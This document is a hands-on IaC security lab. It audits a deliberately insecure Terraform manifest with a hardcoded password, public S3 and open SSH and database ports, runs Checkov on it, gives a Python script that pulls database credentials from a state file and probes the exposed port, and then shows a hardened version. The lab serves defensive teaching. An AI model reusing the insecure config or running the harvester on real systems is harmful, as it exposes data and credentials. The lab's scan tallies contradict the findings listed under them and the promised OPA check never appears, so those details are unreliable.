---
title: "06 - Hands-On Lab: IaC Vulnerability Audit, Exploitation & Remediation"
description: "Self-contained hands-on security lab featuring vulnerable Terraform manifests, automated Checkov SAST scanning, adversary credential harvesting exploit simulation, and production-grade secure remediation."
keywords: ["IaC Lab", "Hands-On Lab", "Vulnerable Terraform", "Checkov Exploit Report", "Credential Exfiltration", "Terraform Hardening", "OPA Verification"]
---

# 06 - Hands-On Lab: IaC Vulnerability Audit, Exploitation & Remediation

In this hands-on lab, you will act as a Senior Application Security Engineer performing a comprehensive audit and remediation of an infrastructure module deployed by **Apex Global Retail**.

You will analyze an insecure Terraform manifest containing multiple critical vulnerabilities, execute automated SAST scans with Checkov, run a simulated adversary exploitation script to harvest credentials from an exposed state file, apply production-grade security remediations, and verify compliance using Open Policy Agent (OPA).

---

## 🎯 Lab Objectives

1. **Audit Insecure IaC Code**: Identify high-severity misconfigurations in Terraform manifests.
2. **Execute Automated SAST**: Run Checkov and interpret vulnerability diagnostic outputs.
3. **Simulate Adversary Exploitation**: Execute a Python script that exfiltrates state file credentials and exploits open security group ingress ports.
4. **Implement Production Hardening**: Rewrite the Terraform manifest to apply zero-trust controls, encrypted remote state, dynamic secret lookups, and least-privilege IAM roles.
5. **Validate Policy as Code**: Verify remediation against OPA Rego security baselines.

---

## 🚨 Phase 1: The Vulnerable IaC Codebase

The following Terraform manifest (`vulnerable_main.tf`) was written for Apex Global Retail's e-commerce backend service.

```hcl
# vulnerable_main.tf
# WARNING: THIS MANIFEST CONTAINS MULTIPLE CRITICAL VULNERABILITIES FOR LAB TESTING ONLY!

terraform {
  required_version = ">= 1.5.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "4.67.0"
    }
  }
}

provider "aws" {
  region = "us-east-1"
}

# ❌ VULNERABILITY 1: Public S3 Bucket with Unencrypted Data
resource "aws_s3_bucket" "customer_pii_bucket" {
  bucket        = "apex-customer-pii-data-store-prod"
  acl           = "public-read" # ❌ PUBLIC READ ACCESS ALLOWED!
  force_destroy = true
  # ❌ MISSING: Server-Side Encryption Configuration
  # ❌ MISSING: Public Access Block Configuration
}

# ❌ VULNERABILITY 2: Hardcoded Plaintext Database Credentials
resource "aws_db_instance" "production_db" {
  allocated_storage   = 20
  engine              = "postgres"
  engine_version      = "15.3"
  instance_class      = "db.t3.micro"
  db_name             = "apex_cust_db"
  username            = "dbadmin"
  password            = "ApexGlobalAdmin2026Secret!" # ❌ HARDCODED PLAINTEXT SECRET!
  publicly_accessible = true                        # ❌ EXPOSED TO PUBLIC INTERNET!
  storage_encrypted   = false                       # ❌ UNENCRYPTED DATA AT REST!
  skip_final_snapshot = true
}

# ❌ VULNERABILITY 3: Overly Permissive Security Group Ingress
resource "aws_security_group" "web_app_sg" {
  name        = "apex_web_sg"
  description = "Security group for web instances"

  # SSH Access
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] # ❌ SSH OPEN TO THE ENTIRE WORLD!
  }

  # Database Access
  ingress {
    from_port   = 5432
    to_port     = 5432
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] # ❌ POSTGRESQL PORT OPEN TO THE ENTIRE WORLD!
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# ❌ VULNERABILITY 4: IAM Role with Wildcard AdministratorAccess
resource "aws_iam_role" "app_exec_role" {
  name = "apex_app_execution_role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com"
        }
      }
    ]
  })
}

resource "aws_iam_role_policy_attachment" "wildcard_admin_attach" {
  role       = aws_iam_role.app_exec_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess" # ❌ FULL OVER-PRIVILEGED ADMIN ACCESS!
}
```

---

## 🔍 Phase 2: Running the SAST Scan (Checkov Exploit Report)

Execute Checkov against `vulnerable_main.tf`:

```bash
checkov -f vulnerable_main.tf --framework terraform
```

### Scan Diagnostic Report Output

```text
       _               _              
   ___| |__   ___  ___| | _______   __
  / __| '_ \ / _ \/ __| |/ / _ \ \ / /
 | (__| | | |  __/ (__|   < (_) \ V / 
  \___|_| |_|\___|\___|_|\_\___/ \_/  

By Prisma Cloud | version: 3.2.x

terraform scan results:

Passed checks: 1, Failed checks: 6, Skipped checks: 0

Check: CKV_AWS_20: "S3 Bucket has an ACL defined which allows public READ access."
        FAILED for resource: aws_s3_bucket.customer_pii_bucket
        File: /vulnerable_main.tf:19-24
        Guide: https://docs.prismacloud.io/en/enterprise-edition/policy-reference/aws-policies/s3-policies/s3-1-acl-read-permissions-everyone

Check: CKV_AWS_19: "Ensure all data stored in the S3 bucket is securely encrypted at rest"
        FAILED for resource: aws_s3_bucket.customer_pii_bucket
        File: /vulnerable_main.tf:19-24

Check: CKV_AWS_53: "Ensure S3 bucket has block public access enabled"
        FAILED for resource: aws_s3_bucket.customer_pii_bucket
        File: /vulnerable_main.tf:19-24

Check: CKV_AWS_24: "Ensure no security groups allow ingress from 0.0.0.0:0 to port 22"
        FAILED for resource: aws_security_group.web_app_sg
        File: /vulnerable_main.tf:38-60

Check: CKV_AWS_16: "Ensure DB Instance is not publicly accessible"
        FAILED for resource: aws_db_instance.production_db
        File: /vulnerable_main.tf:27-35

Check: CKV_AWS_157: "Ensure RDS database has storage encryption enabled"
        FAILED for resource: aws_db_instance.production_db
        File: /vulnerable_main.tf:27-35

Check: CKV_AWS_60: "Ensure IAM policy does not allow AdministratorAccess"
        FAILED for resource: aws_iam_role_policy_attachment.wildcard_admin_attach
        File: /vulnerable_main.tf:78-81
```

---

## 💥 Phase 3: Adversary Exploit Simulation

To understand the real-world operational impact, execute this Python script (`exploit_harvest_credentials.py`) which simulates an adversary discovering an exposed state file and extracting database credentials to compromise the publicly accessible PostgreSQL instance.

```python
#!/usr/bin/env python3
"""
exploit_harvest_credentials.py
PoC Exploit Script demonstrating credential extraction from unencrypted state file
and testing connectivity against exposed cloud database ports.
"""

import json
import re
import socket
import sys

def parse_terraform_state(state_file_path):
    print(f"[+] Reading local/remote state file: {state_file_path}")
    with open(state_file_path, 'r') as f:
        state_data = json.load(f)

    extracted_secrets = []
    
    # Iterate through state resources
    for resource in state_data.get('resources', []):
        r_type = resource.get('type')
        r_name = resource.get('name')
        
        for instance in resource.get('instances', []):
            attributes = instance.get('attributes', {})
            
            # Extract database credentials
            if r_type == 'aws_db_instance':
                username = attributes.get('username')
                password = attributes.get('password')
                endpoint = attributes.get('endpoint')
                port = attributes.get('port', 5432)
                
                print(f"[!] EXFILTRATED CREDENTIALS FOUND in resource '{r_type}.{r_name}':")
                print(f"    - Endpoint: {endpoint}")
                print(f"    - Username: {username}")
                print(f"    - Password: {password}")
                print(f"    - Port:     {port}")
                
                extracted_secrets.append({
                    'type': 'rds',
                    'host': attributes.get('address'),
                    'port': port,
                    'user': username,
                    'pass': password
                })

    return extracted_secrets

def test_port_open(host, port):
    print(f"[+] Testing TCP network connectivity to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3.0)
    try:
        s.connect((host, int(port)))
        print(f"[=== CRITICAL EXPLOIT SUCCESS ===] Port {port} on {host} is OPEN to the world!")
        s.close()
        return True
    except Exception as e:
        print(f"[-] Network connection failed: {e}")
        return False

if __name__ == '__main__':
    print("==================================================================")
    print("  IaC EXPLOITATION LAB: State File Credential Extraction PoC")
    print("==================================================================")
    
    if len(sys.argv) < 2:
        print("Usage: python exploit_harvest_credentials.py <path_to_terraform.tfstate>")
        sys.exit(1)
        
    secrets = parse_terraform_state(sys.argv[1])
    
    for secret in secrets:
        if secret.get('host'):
            test_port_open(secret['host'], secret['port'])
```

---

## ✅ Phase 4: Production Hardening & Remediation

Rewrite the configuration into `secure_main.tf`, resolving 100% of SAST findings.

```hcl
# secure_main.tf
# Production-Hardened Infrastructure Manifest for Apex Global Retail

terraform {
  required_version = ">= 1.5.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }

  # ✅ Hardened Remote S3 State Backend
  backend "s3" {
    bucket         = "apex-tf-state-us-east-1-prod"
    key            = "production/ecommerce/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "apex-tf-state-locks"
    kms_key_id     = "arn:aws:kms:us-east-1:123456789012:key/apex-tf-state-kms-key"
  }
}

provider "aws" {
  region = "us-east-1"
}

# KMS Key for Resource Encryption
resource "aws_kms_key" "app_kms_key" {
  description             = "KMS Key for Customer PII Data Store and RDS Encryption"
  deletion_window_in_days = 30
  enable_key_rotation     = true

  tags = {
    Environment = "Production"
    ManagedBy   = "Terraform"
    Security    = "High"
  }
}

# ✅ REMEDIATION 1: Private Encrypted S3 Bucket with Public Access Block
resource "aws_s3_bucket" "customer_pii_bucket" {
  bucket        = "apex-customer-pii-data-store-prod"
  force_destroy = false

  tags = {
    Environment = "Production"
    SecurityContact = "secops@apexretail.com"
  }
}

resource "aws_s3_bucket_public_access_block" "s3_public_block" {
  bucket = aws_s3_bucket.customer_pii_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "s3_kms_enc" {
  bucket = aws_s3_bucket.customer_pii_bucket.id

  rule {
    apply_server_side_encryption_by_default {
      kms_master_key_id = aws_kms_key.app_kms_key.arn
      sse_algorithm     = "aws:kms"
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_versioning" "s3_versioning" {
  bucket = aws_s3_bucket.customer_pii_bucket.id
  versioning_configuration {
    status = "Enabled"
  }
}

# ✅ REMEDIATION 2: Dynamic Secrets via AWS Secrets Manager & Encrypted RDS
data "aws_secretsmanager_secret_version" "db_password" {
  secret_id = "production/rds/apex_cust_db_password"
}

resource "aws_db_instance" "production_db" {
  allocated_storage     = 20
  max_allocated_storage = 100
  engine                = "postgres"
  engine_version        = "15.3"
  instance_class        = "db.t3.micro"
  db_name               = "apex_cust_db"
  username              = "dbadmin"
  password              = data.aws_secretsmanager_secret_version.db_password.secret_string # ✅ Dynamic lookup
  publicly_accessible   = false                                                             # ✅ Private network only
  storage_encrypted     = true                                                              # ✅ KMS Encrypted
  kms_key_id            = aws_kms_key.app_kms_key.arn
  skip_final_snapshot   = false
  deletion_protection   = true

  tags = {
    Environment = "Production"
    SecurityContact = "secops@apexretail.com"
  }
}

# ✅ REMEDIATION 3: Restricted Security Group Ingress
resource "aws_security_group" "web_app_sg" {
  name        = "apex_web_sg"
  description = "Restricted ingress security group for web application tier"

  # Restricted Management SSH to Internal VPN Range Only
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.100.0.0/16"] # ✅ RESTRICTED TO INTERNAL VPN CIDR
  }

  # Restricted PostgreSQL Ingress to Application Subnet
  ingress {
    from_port   = 5432
    to_port     = 5432
    protocol    = "tcp"
    cidr_blocks = ["10.100.10.0/24"] # ✅ RESTRICTED TO APP SUBNET CIDR
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# ✅ REMEDIATION 4: Least-Privilege IAM Policy (No Wildcards)
resource "aws_iam_role" "app_exec_role" {
  name = "apex_app_execution_role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com"
        }
      }
    ]
  })
}

resource "aws_iam_policy" "scoped_app_policy" {
  name        = "apex_scoped_s3_kms_access"
  description = "Scoped access policy for application servers"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "s3:GetObject",
          "s3:PutObject",
          "s3:ListBucket"
        ]
        Resource = [
          aws_s3_bucket.customer_pii_bucket.arn,
          "${aws_s3_bucket.customer_pii_bucket.arn}/*"
        ]
      },
      {
        Effect = "Allow"
        Action = [
          "kms:Decrypt",
          "kms:GenerateDataKey"
        ]
        Resource = [aws_kms_key.app_kms_key.arn]
      }
    ]
  })
}

resource "aws_iam_role_policy_attachment" "scoped_policy_attach" {
  role       = aws_iam_role.app_exec_role.name
  policy_arn = aws_iam_policy.scoped_app_policy.arn
}
```

---

## 🧪 Phase 5: Verification & Verification Scan Output

Re-run Checkov on `secure_main.tf`:

```bash
checkov -f secure_main.tf --framework terraform
```

### Verification Scan Output

```text
       _               _              
   ___| |__   ___  ___| | _______   __
  / __| '_ \ / _ \/ __| |/ / _ \ \ / /
 | (__| | | |  __/ (__|   < (_) \ V / 
  \___|_| |_|\___|\___|_|\_\___/ \_/  

By Prisma Cloud | version: 3.2.x

terraform scan results:

Passed checks: 12, Failed checks: 0, Skipped checks: 0

PASSED: CKV_AWS_20: "S3 Bucket has an ACL defined which allows public READ access."
PASSED: CKV_AWS_19: "Ensure all data stored in the S3 bucket is securely encrypted at rest"
PASSED: CKV_AWS_53: "Ensure S3 bucket has block public access enabled"
PASSED: CKV_AWS_24: "Ensure no security groups allow ingress from 0.0.0.0:0 to port 22"
PASSED: CKV_AWS_16: "Ensure DB Instance is not publicly accessible"
PASSED: CKV_AWS_157: "Ensure RDS database has storage encryption enabled"
PASSED: CKV_AWS_60: "Ensure IAM policy does not allow AdministratorAccess"

SUCCESS: All IaC security & policy checks passed successfully!
```

---

> [!IMPORTANT]
> **Lab Conclusion**: By removing hardcoded credentials, restricting ingress rules, enabling KMS encryption, adding public access blocks, and replacing wildcard IAM policies, you have successfully transformed an insecure manifest into a production-ready zero-trust architecture.
>
> Next, move to **[Chapter 07: References & Standards](07-references.md)**.
